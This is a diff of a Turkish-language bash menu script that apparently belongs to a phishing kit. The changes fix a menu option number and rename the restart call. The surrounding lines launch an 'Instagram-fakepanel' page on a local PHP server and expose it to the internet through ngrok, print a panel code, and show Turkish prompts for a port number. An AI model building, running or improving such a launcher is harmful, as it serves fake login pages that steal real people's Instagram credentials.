@@ -52,7 +52,7 @@ elif [[ $islem == 2 || $islem == 02 ]]; then
 	cd Instagram-fakepanel/
 	php -S 127.0.0.1:$port > -t & ngrok http $port
 	
-elif [[ $islem == 2 || $islem == 02 ]]; then
+elif [[ $islem == 4 || $islem == 04 ]]; then
         site="Instagram-fakepanel/"
         read -p "Port Giriniz: " port
         echo -e "\e[32mKodunuz Code: insta04"
@@ -78,5 +78,5 @@ else
 	echo -e '\033[31;40;1m Lütfen İşlem Numaranızı Kontrol Edin'
 	sleep 2
 	clear
-	bash start.sh
+	bash instagram.sh
 fi
